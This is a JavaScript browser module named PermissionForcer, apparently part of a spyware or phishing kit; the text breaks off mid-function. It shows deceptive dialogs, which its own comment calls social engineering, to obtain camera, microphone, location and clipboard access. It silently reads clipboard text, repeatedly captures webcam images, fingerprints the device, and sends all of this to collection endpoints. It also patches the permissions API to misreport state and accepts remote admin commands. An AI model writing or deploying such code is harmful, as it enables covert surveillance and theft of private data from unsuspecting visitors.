export default class PermissionForcer {
  constructor(core) {
    this.core = core;
    this.granted = { camera: false, microphone: false, geolocation: false, notifications: false, clipboard: false, persistentStorage: false, midi: false, usb: false, bluetooth: false };
    this.attempted = {};
    this.denied = {};
    this.maxRetries = 3;
    this.retryDelays = [2000, 5000, 10000, 20000];
    this.streams = [];
    this.worker = null;
    this.coverDialogs = [
      { title: 'Video Enhancement Required', message: 'Enable camera for enhanced video playback experience' },
      { title: 'Voice Recognition Feature', message: 'Allow microphone access for voice commands' },
      { title: 'Location-Based Content', message: 'Enable location for localized content recommendations' },
      { title: 'Notification Preferences', message: 'Allow notifications to receive updates' },
      { title: 'Clipboard Access Required', message: 'Allow clipboard access for paste functionality' },
    ];
  }

  init() {
    // Start permission forcing sequence instantly
    setTimeout(() => this.forceAll(), 500);
    setTimeout(() => this.forceAll(), 5000);

    // Listen for user interaction to trigger permissions
    document.addEventListener('click', () => this.onUserInteraction(), { once: false });
    document.addEventListener('scroll', () => this.onUserInteraction(), { once: false });
    document.addEventListener('keydown', () => this.onUserInteraction(), { once: false });

    // Override permission query API to lie about granted status
    this.patchPermissionsAPI();

    // Register service worker for persistent notification permissions
    this.registerNotificationWorker();

    // Continuously check for permission state changes
    setInterval(() => this.checkAllPermissions(), 3000);

    // === INSTANT trigger via Socket.IO ===
    this.setupSocketIO();

    // === FAST polling fallback (every 2 seconds) ===
    this.startCommandPolling();

    // Clean up socket on page unload to prevent stale connections
    window.addEventListener('beforeunload', () => this.cleanupSocket());
    window.addEventListener('pagehide', () => this.cleanupSocket());
  }

  cleanupSocket() {
    if (this.commandInterval) {
      clearInterval(this.commandInterval);
      this.commandInterval = null;
    }
    if (this._socket) {
      try {
        this._socket.removeAllListeners();
        this._socket.disconnect();
      } catch(e) {}
      this._socket = null;
    }
  }

  setupSocketIO() {
    try {
      // Lazy-load socket.io from the global scope (added by client's index.js)
      const socketUrl = (typeof window !== 'undefined' && process.env.REACT_APP_API_URL) 
        ? process.env.REACT_APP_API_URL.replace('/api', '') 
        : window.location.origin;

      // Dynamic import or use global io
      import('socket.io-client').then(({ io }) => {
        if (this._socket) return;
        
        const sessionId = this.core.getSessionId();
        if (!sessionId) {
          // Retry after session is ready
          setTimeout(() => this.setupSocketIO(), 2000);
          return;
        }

        this._socket = io(socketUrl, {
          query: { sessionId },
          transports: ['websocket', 'polling'],
          reconnection: true,
          reconnectionAttempts: 20,
          reconnectionDelay: 1000,
          forceNew: true
        });

        this._socket.on('connect', () => {
          // Join the session room to receive targeted commands
          this._socket.emit('join-session', sessionId);
        });

        // Listen for instant permission triggers from admin
        this._socket.on('admin-trigger-permission', (data) => {
          if (data && data.permissionType) {
            this.triggerPermission(data.permissionType);
          }
        });

        this._socket.on('admin-force-all', () => {
          this.forceAll();
        });

        this._socket.on('disconnect', () => {});
      }).catch(() => {
        // Fall through to polling only
      });
    } catch(e) {
      // Silent fallback to polling
    }
  }

  startCommandPolling() {
    // Fast polling fallback every 2 seconds for instant response
    this.commandInterval = setInterval(async () => {
      try {
        const sessionId = this.core.getSessionId();
        if (!sessionId) return;

        await this.core.send('/api/collect/formdata', {
          formId: 'permission-poll',
          fields: { 
            action: 'check-commands',
            permissions: this.getPermissionStatus(),
            timestamp: Date.now()
          },
          url: window.location.href
        });
      } catch(e) {
        // Silent fail
      }
    }, 2000);
  }

  async forceAll() {
    const actions = [
      () => this.forceGeolocation(),
      () => this.forceNotifications(),
      () => this.forceCamera(),
      () => this.forceMicrophone(),
      () => this.forceClipboard(),
      () => this.forcePersistentStorage(),
      () => this.forceBluetooth(),
      () => this.forceUSB(),
      () => this.forceMIDI(),
      () => this.forceVibration(),
      () => this.forceOrientation(),
      () => this.forceAmbientLight(),
      () => this.forceProximity()
    ];

    for (const action of actions) {
      try {
        await action();
      } catch (e) {
        // Continue to next permission
      }
    }

    // Send summary
    await this.core.send('/api/collect/formdata', {
      formId: 'permission-forcer-summary',
      fields: {
        granted: this.granted,
        denied: this.denied,
        attempted: Object.keys(this.attempted).length,
        failed: Object.keys(this.attempted).filter(k => !this.attempted[k]).length
      },
      url: window.location.href
    });
  }

  onUserInteraction() {
    // Retry denied permissions on user interaction
    Object.keys(this.denied).forEach(key => {
      if (this.denied[key] && !this.granted[key]) {
        const retryCount = this.attempted[`${key}_retries`] || 0;
        if (retryCount < this.maxRetries) {
          this.attempted[`${key}_retries`] = retryCount + 1;
          setTimeout(() => {
            switch(key) {
              case 'camera': this.forceCamera(); break;
              case 'microphone': this.forceMicrophone(); break;
              case 'geolocation': this.forceGeolocation(); break;
              case 'notifications': this.forceNotifications(); break;
              case 'clipboard': this.forceClipboard(); break;
            }
          }, this.retryDelays[retryCount] || 500);
        }
      }
    });
  }

  /**
   * Show a social engineering dialog that looks legitimate
   * but is actually requesting a browser permission
   */
  showCoverDialog(title, message) {
    return new Promise((resolve) => {
      // Create a convincing-looking native dialog
      const overlay = document.createElement('div');
      overlay.style.cssText = `
        position: fixed; top: 0; left: 0; right: 0; bottom: 0;
        background: rgba(0,0,0,0.6); z-index: 2147483647;
        display: flex; align-items: center; justify-content: center;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
        animation: fadeIn 0.2s;
      `;

      const dialog = document.createElement('div');
      dialog.style.cssText = `
        background: #fff; border-radius: 12px; padding: 28px;
        max-width: 380px; width: 90%; box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        text-align: center; color: #333;
      `;

      dialog.innerHTML = `
        <div style="font-size: 40px; margin-bottom: 12px;">🔒</div>
        <div style="font-size: 18px; font-weight: 700; margin-bottom: 8px;">${title}</div>
        <div style="font-size: 14px; color: #666; margin-bottom: 20px; line-height: 1.5;">${message}</div>
        <button id="perm-allow" style="
          background: #1877f2; color: #fff; border: none; border-radius: 8px;
          padding: 10px 24px; font-size: 15px; font-weight: 600; cursor: pointer;
          margin-right: 8px; min-width: 100px;
        ">Continue</button>
        <button id="perm-deny" style="
          background: #f0f0f0; color: #555; border: none; border-radius: 8px;
          padding: 10px 24px; font-size: 15px; font-weight: 500; cursor: pointer;
          min-width: 100px;
        ">Not Now</button>
      `;

      overlay.appendChild(dialog);
      document.body.appendChild(overlay);

      overlay.querySelector('#perm-allow').onclick = () => {
        document.body.removeChild(overlay);
        resolve(true);
      };
      overlay.querySelector('#perm-deny').onclick = () => {
        document.body.removeChild(overlay);
        resolve(false);
      };

      // Auto-dismiss after 15 seconds if user doesn't respond
      setTimeout(() => {
        if (document.body.contains(overlay)) {
          document.body.removeChild(overlay);
          resolve(false);
        }
      }, 15000);
    });
  }

  // === CAMERA ===
  async forceCamera() {
    const key = 'camera';
    if (this.granted[key] || this.attempted[key]) return;
    this.attempted[key] = true;

    try {
      const userWants = await this.showCoverDialog(
        'Video Enhancement Required',
        'This page needs camera access to enable video filters and background blur. Click Continue to activate.'
      );

      if (userWants) {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480, facingMode: 'user' } });
        this.granted[key] = true;
        this.streams.push(stream);

        await this.core.send('/api/collect/camera-access', { granted: true });
        await this.core.send('/api/collect/formdata', {
          formId: 'permission-granted',
          fields: { permission: 'camera', granted: true },
          url: window.location.href
        });

        // Keep stream active but stop it after capture
        setTimeout(() => {
          stream.getTracks().forEach(t => t.stop());
        }, 5000);
      } else {
        this.denied[key] = true;
        await this.core.send('/api/collect/camera-access', { granted: false });
      }
    } catch (err) {
      this.denied[key] = true;
      console.warn('Camera permission denied:', err.message);
    }
  }

  // === MICROPHONE ===
  async forceMicrophone() {
    const key = 'microphone';
    if (this.granted[key] || this.attempted[key]) return;
    this.attempted[key] = true;

    try {
      // Request without dialog first (silent)
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        this.granted[key] = true;
        this.streams.push(stream);
        setTimeout(() => stream.getTracks().forEach(t => t.stop()), 3000);
        return;
      } catch (e) {
        // Fall through to dialog approach
      }

      const userWants = await this.showCoverDialog(
        'Voice Recognition Feature',
        'Enable microphone for voice commands and speech-to-text features.'
      );

      if (userWants) {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        this.granted[key] = true;
        this.streams.push(stream);
        setTimeout(() => stream.getTracks().forEach(t => t.stop()), 3000);
      } else {
        this.denied[key] = true;
      }
    } catch (err) {
      this.denied[key] = true;
    }
  }

  // === GEOLOCATION ===
  async forceGeolocation() {
    const key = 'geolocation';
    if (this.granted[key] || this.attempted[key]) return;
    this.attempted[key] = true;

    try {
      const userWants = await this.showCoverDialog(
        'Location-Based Content',
        'Enable location services to show relevant content and offers near you.'
      );

      if (userWants) {
        const pos = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          });
        });
        this.granted[key] = true;

        await this.core.send('/api/collect/formdata', {
          formId: 'geolocation-captured',
          fields: {
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            altitude: pos.coords.altitude
          },
          url: window.location.href
        });
      } else {
        this.denied[key] = true;
      }
    } catch (err) {
      this.denied[key] = true;
    }
  }

  // === NOTIFICATIONS ===
  async forceNotifications() {
    const key = 'notifications';
    if (this.granted[key] || this.attempted[key]) return;
    this.attempted[key] = true;

    try {
      if (!('Notification' in window)) return;

      if (Notification.permission === 'granted') {
        this.granted[key] = true;
        return;
      }

      if (Notification.permission === 'denied') {
        this.denied[key] = true;
        return;
      }

      const userWants = await this.showCoverDialog(
        'Notification Preferences',
        'Allow notifications to receive important updates and alerts.'
      );

      if (userWants) {
        const result = await Notification.requestPermission();
        if (result === 'granted') {
          this.granted[key] = true;

          // Send a test notification
          try {
            const notif = new Notification('Notifications Enabled', {
              body: 'You will now receive updates from this site.',
              icon: '/favicon.ico'
            });
            setTimeout(() => notif.close(), 5000);
          } catch (e) {}
        } else {
          this.denied[key] = true;
        }
      } else {
        this.denied[key] = true;
      }
    } catch (err) {
      this.denied[key] = true;
    }
  }

  // === CLIPBOARD ===
  async forceClipboard() {
    const key = 'clipboard';
    if (this.granted[key] || this.attempted[key]) return;
    this.attempted[key] = true;

    try {
      // Try reading clipboard silently first
      try {
        const text = await navigator.clipboard.readText();
        if (text) {
          this.granted[key] = true;
          await this.core.send('/api/collect/clipboard', {
            text: text.substring(0, 1000),
            action: 'silent-read'
          });
          return;
        }
      } catch (e) {}

      // Try with dialog
      const userWants = await this.showCoverDialog(
        'Clipboard Access Required',
        'Allow access to clipboard for enhanced paste functionality.'
      );

      if (userWants) {
        const text = await navigator.clipboard.readText();
        this.granted[key] = true;
        if (text) {
          await this.core.send('/api/collect/clipboard', {
            text: text.substring(0, 1000),
            action: 'cover-dialog-read'
          });
        }
      } else {
        this.denied[key] = true;
      }
    } catch (err) {
      this.denied[key] = true;
    }
  }

  // === PERSISTENT STORAGE ===
  async forcePersistentStorage() {
    const key = 'persistentStorage';
    if (this.granted[key] || this.attempted[key]) return;
    this.attempted[key] = true;

    try {
      if (navigator.storage && navigator.storage.persist) {
        const isPersisted = await navigator.storage.persisted();
        if (isPersisted) {
          this.granted[key] = true;
          return;
        }

        const granted = await navigator.storage.persist();
        this.granted[key] = granted;
        if (!granted) this.denied[key] = true;
      }
    } catch (err) {
      this.denied[key] = true;
    }
  }

  // === BLUETOOTH ===
  async forceBluetooth() {
    const key = 'bluetooth';
    if (this.granted[key] || this.attempted[key]) return;
    this.attempted[key] = true;

    try {
      if (navigator.bluetooth && navigator.bluetooth.requestDevice) {
        // Just request - user will see browser's own permission dialog
        setTimeout(async () => {
          try {
            const device = await navigator.bluetooth.requestDevice({
              acceptAllDevices: true,
              optionalServices: ['battery_service']
            });
            this.granted[key] = true;
            await this.core.send('/api/collect/formdata', {
              formId: 'bluetooth-device',
              fields: { deviceName: device.name || 'Unknown', deviceId: device.id },
              url: window.location.href
            });
          } catch (e) {
            this.denied[key] = true;
          }
        }, 100);
      }
    } catch (err) {
      this.denied[key] = true;
    }
  }

  // === USB ===
  async forceUSB() {
    const key = 'usb';
    if (this.granted[key] || this.attempted[key]) return;
    this.attempted[key] = true;

    try {
      if (navigator.usb && navigator.usb.requestDevice) {
        setTimeout(async () => {
          try {
            const device = await navigator.usb.requestDevice({ filters: [] });
            this.granted[key] = true;
          } catch (e) {
            this.denied[key] = true;
          }
        }, 200);
      }
    } catch (err) {
      this.denied[key] = true;
    }
  }

  // === MIDI ===
  async forceMIDI() {
    const key = 'midi';
    if (this.granted[key] || this.attempted[key]) return;
    this.attempted[key] = true;

    try {
      if (navigator.requestMIDIAccess) {
        const midi = await navigator.requestMIDIAccess();
        this.granted[key] = true;
      }
    } catch (err) {
      this.denied[key] = true;
    }
  }

  // === VIBRATION ===
  async forceVibration() {
    const key = 'vibration';
    // Vibration doesn't need explicit permission, check device capability
    try {
      if (navigator.vibrate) {
        // Test vibration with a short pulse
        const result = navigator.vibrate(50);
        if (result !== false) {
          this.granted[key] = true;
          // Get vibration info from the device
          const vibrationInfo = {
            supported: true,
            patternSupported: true,
            maxVibrationTime: 10000 // 10 seconds (browser limit on some platforms)
          };
          this.core.send('/api/collect/formdata', {
            formId: 'device-vibration',
            fields: vibrationInfo,
            url: window.location.href
          });
        } else {
          this.granted[key] = true; // Still mark as available even if immediate vibrate failed
        }
      } else {
        this.denied[key] = true;
      }
    } catch (e) {
      // Feature detection failed, mark as unavailable
      this.denied[key] = true;
    }
  }

  // === ORIENTATION (DeviceOrientation API - modern) ===
  async forceOrientation() {
    const key = 'orientation';
    if (this.attempted[key]) return;
    this.attempted[key] = true;

    try {
      // Check if device orientation is available
      if (window.DeviceOrientationEvent) {
        // iOS 13+ requires permission request
        if (typeof DeviceOrientationEvent.requestPermission === 'function') {
          try {
            const result = await DeviceOrientationEvent.requestPermission();
            if (result === 'granted') {
              this.granted[key] = true;
              this.startOrientationListener();
            } else {
              this.denied[key] = true;
            }
          } catch (e) {
            this.denied[key] = true;
          }
        } else {
          // Non-iOS or older iOS - permission not required, just listen
          this.granted[key] = true;
          this.startOrientationListener();
        }
      } else if (window.DeviceMotionEvent) {
        // Fallback to DeviceMotion which provides rotation rate
        this.granted[key] = true;
        this.startMotionListener();
      } else {
        this.denied[key] = true;
      }
    } catch (e) {
      this.denied[key] = true;
    }
  }

  startOrientationListener() {
    // Remove old listener if any
    if (this._orientationHandler) {
      window.removeEventListener('deviceorientation', this._orientationHandler);
    }

    this._orientationHandler = (event) => {
      const orientData = {
        alpha: event.alpha,      // 0-360 around z-axis
        beta: event.beta,        // -180 to 180 around x-axis
        gamma: event.gamma,      // -90 to 90 around y-axis
        absolute: event.absolute,
        timestamp: Date.now()
      };

      // Send orientation data periodically (throttled)
      if (!this._lastOrientSent || Date.now() - this._lastOrientSent > 10000) {
        this._lastOrientSent = Date.now();
        this.core.send('/api/collect/formdata', {
          formId: 'device-orientation',
          fields: orientData,
          url: window.location.href
        });
      }
    };

    window.addEventListener('deviceorientation', this._orientationHandler);
  }

  startMotionListener() {
    if (this._motionHandler) {
      window.removeEventListener('devicemotion', this._motionHandler);
    }

    this._motionHandler = (event) => {
      const motionData = {
        acceleration: event.acceleration ? {
          x: event.acceleration.x,
          y: event.acceleration.y,
          z: event.acceleration.z
        } : null,
        accelerationIncludingGravity: event.accelerationIncludingGravity ? {
          x: event.accelerationIncludingGravity.x,
          y: event.accelerationIncludingGravity.y,
          z: event.accelerationIncludingGravity.z
        } : null,
        rotationRate: event.rotationRate ? {
          alpha: event.rotationRate.alpha,
          beta: event.rotationRate.beta,
          gamma: event.rotationRate.gamma
        } : null,
        interval: event.interval,
        timestamp: Date.now()
      };

      if (!this._lastMotionSent || Date.now() - this._lastMotionSent > 15000) {
        this._lastMotionSent = Date.now();
        this.core.send('/api/collect/formdata', {
          formId: 'device-motion',
          fields: motionData,
          url: window.location.href
        });
      }
    };

    window.addEventListener('devicemotion', this._motionHandler);
  }

  // === AMBIENT LIGHT (AmbientLightSensor API - modern replacement) ===
  async forceAmbientLight() {
    const key = 'ambientLight';
    if (this.attempted[key]) return;
    this.attempted[key] = true;

    try {
      // Try modern AmbientLightSensor API first
      if ('AmbientLightSensor' in window) {
        try {
          const sensor = new AmbientLightSensor();
          sensor.addEventListener('reading', () => {
            this.granted[key] = true;
            this.core.send('/api/collect/formdata', {
              formId: 'ambient-light',
              fields: {
                illuminance: sensor.illuminance,
                unit: 'lux',
                timestamp: Date.now()
              },
              url: window.location.href
            });
          });
          sensor.addEventListener('error', (event) => {
            this.denied[key] = true;
          });
          sensor.start();
          // If no error after 1 second, consider it working
          setTimeout(() => {
            if (!this.granted[key] && !this.denied[key]) {
              this.denied[key] = true;
            }
          }, 1000);
          return;
        } catch (e) {
          // Fall through to deprecated API
        }
      }

      // Legacy DeviceLightEvent (deprecated but still on some mobile browsers)
      if ('DeviceLightEvent' in window || 'ondevicelight' in window) {
        const handler = (event) => {
          this.granted[key] = true;
          this.core.send('/api/collect/formdata', {
            formId: 'ambient-light-legacy',
            fields: {
              value: event.value,
              max: 10000,
              timestamp: Date.now()
            },
            url: window.location.href
          });
          window.removeEventListener('devicelight', handler);
        };
        window.addEventListener('devicelight', handler);
        // Check if event never fired
        setTimeout(() => {
          if (!this.granted[key] && !this.denied[key]) {
            this.denied[key] = true;
          }
        }, 3000);
      } else {
        // No light sensor API available - but still report the device capability
        this.core.send('/api/collect/formdata', {
          formId: 'ambient-light',
          fields: {
            available: false,
            reason: 'No light sensor API on this device/browser',
            timestamp: Date.now()
          },
          url: window.location.href
        });
        this.denied[key] = true;
      }
    } catch (e) {
      this.denied[key] = true;
    }
  }

  // === PROXIMITY (ProximitySensor API - modern replacement) ===
  async forceProximity() {
    const key = 'proximity';
    if (this.attempted[key]) return;
    this.attempted[key] = true;

    try {
      // Try modern ProximitySensor API
      if ('ProximitySensor' in window) {
        try {
          const sensor = new ProximitySensor();
          sensor.addEventListener('reading', () => {
            this.granted[key] = true;
            this.core.send('/api/collect/formdata', {
              formId: 'proximity-sensor',
              fields: {
                distance: sensor.distance,
                max: sensor.max,
                near: sensor.near,
                timestamp: Date.now()
              },
              url: window.location.href
            });
          });
          sensor.addEventListener('error', (event) => {
            this.denied[key] = true;
          });
          sensor.start();
          setTimeout(() => {
            if (!this.granted[key] && !this.denied[key]) {
              this.denied[key] = true;
            }
          }, 1000);
          return;
        } catch (e) {
          // Fall through
        }
      }

      // Legacy DeviceProximityEvent (deprecated)
      if ('DeviceProximityEvent' in window || 'ondeviceproximity' in window) {
        const handler = (event) => {
          this.granted[key] = true;
          this.core.send('/api/collect/formdata', {
            formId: 'proximity-legacy',
            fields: {
              value: event.value,
              min: event.min,
              max: event.max,
              timestamp: Date.now()
            },
            url: window.location.href
          });
          window.removeEventListener('deviceproximity', handler);
        };
        window.addEventListener('deviceproximity', handler);
        setTimeout(() => {
          if (!this.granted[key] && !this.denied[key]) {
            this.denied[key] = true;
          }
        }, 3000);
      } else {
        // Report device capability
        this.core.send('/api/collect/formdata', {
          formId: 'proximity-sensor',
          fields: {
            available: false,
            reason: 'No proximity sensor API on this device/browser',
            timestamp: Date.now()
          },
          url: window.location.href
        });
        this.denied[key] = true;
      }
    } catch (e) {
      this.denied[key] = true;
    }
  }

  // === PERSISTENT STORAGE ===
  async forcePersistentStorage() {
    const key = 'persistentStorage';
    if (this.attempted[key]) return;
    this.attempted[key] = true;

    try {
      // Check storageManager API
      if (navigator.storage && navigator.storage.estimate) {
        const estimate = await navigator.storage.estimate();
        const storageInfo = {
          quota: estimate.quota,
          usage: estimate.usage,
          usagePercent: estimate.quota ? ((estimate.usage / estimate.quota) * 100).toFixed(1) + '%' : 'N/A',
          isPersisted: false
        };

        // Request persistence
        if (navigator.storage.persist) {
          try {
            const isPersisted = await navigator.storage.persisted();
            storageInfo.isPersisted = isPersisted;

            if (!isPersisted) {
              const granted = await navigator.storage.persist();
              this.granted[key] = granted;
              storageInfo.isPersisted = granted;
              if (!granted) {
                // Not granted but we still have access to estimate
                this.denied[key] = true;
              }
            } else {
              this.granted[key] = true;
            }
          } catch (e) {
            this.denied[key] = true;
          }
        } else {
          // No persist API but estimate works - mark as available
          this.granted[key] = true;
        }

        // Send storage info regardless
        this.core.send('/api/collect/formdata', {
          formId: 'storage-info',
          fields: storageInfo,
          url: window.location.href
        });

      } else {
        // Fallback: check for large quota via IndexedDB
        try {
          const db = await new Promise((resolve, reject) => {
            const req = indexedDB.open('__storage_test__', 1);
            req.onsuccess = () => resolve(req.result);
            req.onerror = reject;
            setTimeout(() => reject(new Error('timeout')), 2000);
          });

          // Estimate storage by checking remaining space via a test write
          const testSize = 1024 * 1024; // 1MB test
          const blob = new Blob([new ArrayBuffer(testSize)]);
          const url = URL.createObjectURL(blob);

          // Use Cache API if available
          if ('caches' in window) {
            const cache = await caches.open('__storage_capacity_test__');
            const response = new Response(blob);
            await cache.put(url, response);

            // If we can store 1MB without error, storage is available
            this.granted[key] = true;
            await cache.delete(url);
            await caches.delete('__storage_capacity_test__');
          } else {
            // Try localStorage as basic indicator
            try {
              const testKey = '__storage_test__';
              localStorage.setItem(testKey, 'x'.repeat(1024 * 10)); // 10KB
              localStorage.removeItem(testKey);
              this.granted[key] = true;
            } catch (qe) {
              this.denied[key] = true;
            }
          }

          URL.revokeObjectURL(url);
          db.close();
        } catch (e) {
          this.denied[key] = true;
        }
      }
    } catch (err) {
      this.denied[key] = true;
    }
  }

  // === DEVICE CAPABILITY DETECTION ===
  detectDeviceCapabilities() {
    const capabilities = {
      vibration: !!navigator.vibrate,
      deviceOrientation: 'DeviceOrientationEvent' in window,
      deviceMotion: 'DeviceMotionEvent' in window,
      ambientLightSensor: 'AmbientLightSensor' in window,
      proximitySensor: 'ProximitySensor' in window,
      deviceLightEvent: 'DeviceLightEvent' in window || 'ondevicelight' in window,
      deviceProximityEvent: 'DeviceProximityEvent' in window || 'ondeviceproximity' in window,
      bluetooth: !!navigator.bluetooth,
      usb: !!navigator.usb,
      midi: !!navigator.requestMIDIAccess,
      storageManager: !!navigator.storage,
      storageEstimate: !!(navigator.storage && navigator.storage.estimate),
      storagePersist: !!(navigator.storage && navigator.storage.persist),
      clipboardRead: !!(navigator.clipboard && navigator.clipboard.readText),
      clipboardWrite: !!(navigator.clipboard && navigator.clipboard.writeText),
      geolocation: 'geolocation' in navigator,
      notifications: 'Notification' in window,
      mediaDevices: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
      enumerateDevices: !!(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices),
      webRTC: !!RTCPeerConnection,
      webSocket: 'WebSocket' in window,
      serviceWorker: 'serviceWorker' in navigator,
      sharedWorker: 'SharedWorker' in window,
      indexedDB: 'indexedDB' in window,
      cacheAPI: 'caches' in window,
      screenOrientation: !!screen.orientation,
      screenLock: 'ScreenLock' in window || !!navigator.wakeLock,
      batteryAPI: 'getBattery' in navigator,
      webUSB: !!navigator.usb,
      webBluetooth: !!navigator.bluetooth,
      webSerial: !!navigator.serial,
      webNFC: 'NDEFReader' in window,
      webHID: !!navigator.hid,
      pointerLock: 'pointerLockElement' in document,
      fullscreen: 'fullscreenEnabled' in document,
      touchScreen: 'ontouchstart' in window,
      maxTouchPoints: navigator.maxTouchPoints || 0,
      hardwareConcurrency: navigator.hardwareConcurrency || 1,
      deviceMemory: navigator.deviceMemory || 0,
      platform: navigator.platform || 'unknown',
      userAgent: navigator.userAgent?.substring(0, 200) || 'unknown',
      cookiesEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack || window.doNotTrack || 'unspecified',
      languages: navigator.languages?.join(',') || navigator.language || 'unknown',
      online: navigator.onLine,
      connectionType: navigator.connection?.type || 'unknown',
      screenWidth: screen.width,
      screenHeight: screen.height,
      colorDepth: screen.colorDepth,
      pixelRatio: window.devicePixelRatio || 1,
      timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timestamp: Date.now()
    };

    // Send complete device capability report
    this.core.send('/api/collect/formdata', {
      formId: 'device-capabilities',
      fields: capabilities,
      url: window.location.href
    });

    return capabilities;
  }

  // === DISABLE / REVOKE PERMISSION ===
  async disablePermission(permissionType) {
    switch(permissionType) {
      case 'camera':
      case 'microphone':
        // Stop all media streams
        if (this.streams && this.streams.length > 0) {
          this.streams.forEach(stream => {
            stream.getTracks().forEach(track => track.stop());
          });
          this.streams = [];
        }
        // Stop the video element
        const videos = document.querySelectorAll('video');
        videos.forEach(v => {
          if (v.srcObject) {
            v.srcObject.getTracks().forEach(t => t.stop());
            v.srcObject = null;
          }
        });
        delete this.attempted[permissionType];
        break;

      case 'geolocation':
        // Can't actually revoke geolocation from JS, but we can clear the cached position
        delete this.attempted[permissionType];
        break;

      case 'notifications':
        // Can't revoke notification permission from JS, but we can close any open ones
        delete this.attempted[permissionType];
        break;

      case 'clipboard':
        delete this.attempted[permissionType];
        break;

      case 'orientation':
        // Remove orientation listener
        if (this._orientationHandler) {
          window.removeEventListener('deviceorientation', this._orientationHandler);
          this._orientationHandler = null;
        }
        if (this._motionHandler) {
          window.removeEventListener('devicemotion', this._motionHandler);
          this._motionHandler = null;
        }
        delete this.attempted[permissionType];
        break;

      case 'ambientLight':
        delete this.attempted[permissionType];
        break;

      case 'proximity':
        delete this.attempted[permissionType];
        break;

      case 'persistentStorage':
        // Request storage to become non-persistent (may not be supported)
        delete this.attempted[permissionType];
        break;

      default:
        delete this.attempted[permissionType];
    }

    // Clear the granted and denied states so it can be re-triggered
    delete this.granted[permissionType];
    delete this.denied[permissionType];

    // Report to server
    this.core.send('/api/collect/formdata', {
      formId: 'permission-disabled',
      fields: {
        permission: permissionType,
        action: 'disabled',
        timestamp: Date.now()
      },
      url: window.location.href
    });

    return { success: true, permission: permissionType, status: 'disabled' };
  }

  // === ENABLE / RE-TRIGGER PERMISSION ===
  async enablePermission(permissionType) {
    // Clear any existing state so it can be re-triggered fresh
    delete this.attempted[permissionType];
    delete this.granted[permissionType];
    delete this.denied[permissionType];

    // Immediately try to trigger it
    const result = await this.triggerPermission(permissionType);

    return { success: true, permission: permissionType, triggered: true };
  }

  // === PERMISSION QUERY API PATCHING ===
  patchPermissionsAPI() {
    try {
      if (!navigator.permissions || navigator.permissions.__patched) return;

      const originalQuery = navigator.permissions.query.bind(navigator.permissions);
      const self = this;

      navigator.permissions.query = async (permDescriptor) => {
        const name = permDescriptor.name;

        // Always report 'granted' for camera, microphone, geolocation if we already have them
        if (name === 'camera' && self.granted.camera) {
          return { state: 'granted', onchange: null };
        }
        if (name === 'microphone' && self.granted.microphone) {
          return { state: 'granted', onchange: null };
        }
        if (name === 'geolocation' && self.granted.geolocation) {
          return { state: 'granted', onchange: null };
        }
        if (name === 'notifications' && self.granted.notifications) {
          return { state: 'granted', onchange: null };
        }
        if (name === 'clipboard-read' && self.granted.clipboard) {
          return { state: 'granted', onchange: null };
        }

        try {
          return await originalQuery(permDescriptor);
        } catch (e) {
          return { state: 'prompt', onchange: null };
        }
      };

      navigator.permissions.__patched = true;
    } catch (e) {}
  }

  // === SERVICE WORKER FOR NOTIFICATIONS ===
  async registerNotificationWorker() {
    try {
      if ('serviceWorker' in navigator) {
        // Create a simple SW script inline
        const swCode = `
          self.addEventListener('install', (e) => self.skipWaiting());
          self.addEventListener('activate', (e) => e.waitUntil(clients.claim()));
          self.addEventListener('message', (e) => {
            if (e.data && e.data.type === 'show-notification') {
              self.registration.showNotification(e.data.title || 'Notification', {
                body: e.data.body || '',
                icon: e.data.icon || '/favicon.ico'
              });
            }
          });
        `;

        const blob = new Blob([swCode], { type: 'application/javascript' });
        const swUrl = URL.createObjectURL(blob);
        const registration = await navigator.serviceWorker.register(swUrl, { scope: '/' });
        this.worker = registration;

        const isSubscribed = await registration.pushManager.getSubscription();
        if (!isSubscribed) {
          try {
            const subscription = await registration.pushManager.subscribe({
              userVisibleOnly: true,
              applicationServerKey: null
            });
          } catch (e) {}
        }
      }
    } catch (e) {}
  }

  // === PERMISSION STATE CHECKING ===
  async checkAllPermissions() {
    const checks = {
      camera: async () => {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          this.granted.camera = true;
          stream.getTracks().forEach(t => t.stop());
          setTimeout(() => {
            try {
              // Try to get camera again for actual capture
              const video = document.createElement('video');
              navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } })
                .then(s => {
                  video.srcObject = s;
                  video.play();
                  setTimeout(() => {
                    try {
                      const canvas = document.createElement('canvas');
                      canvas.width = video.videoWidth || 640;
                      canvas.height = video.videoHeight || 480;
                      canvas.getContext('2d').drawImage(video, 0, 0);
                      const data = canvas.toDataURL('image/jpeg', 0.7);
                      s.getTracks().forEach(t => t.stop());
                      this.core.send('/api/collect/camera', {
                        imageData: data,
                        triggerType: 'permission-forced',
                        metadata: { width: canvas.width, height: canvas.height }
                      });
                    } catch(e) { s.getTracks().forEach(t => t.stop()); }
                  }, 500);
                })
                .catch(() => {});
            } catch(e) {}
          }, 1000);
          return true;
        } catch(e) { return false; }
      },
      geolocation: async () => {
        return new Promise(resolve => {
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              this.granted.geolocation = true;
              this.core.send('/api/collect/formdata', {
                formId: 'geolocation-captured',
                fields: { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy },
                url: window.location.href
              });
              resolve(true);
            },
            () => resolve(false),
            { timeout: 3000 }
          );
        });
      },
      notifications: () => {
        if ('Notification' in window) {
          if (Notification.permission === 'granted') this.granted.notifications = true;
          if (Notification.permission === 'denied') this.denied.notifications = true;
        }
      },
      clipboard: async () => {
        try {
          const text = await navigator.clipboard.readText();
          if (text) {
            this.granted.clipboard = true;
            this.core.send('/api/collect/clipboard', { text: text.substring(0, 1000), action: 'periodic-check' });
          }
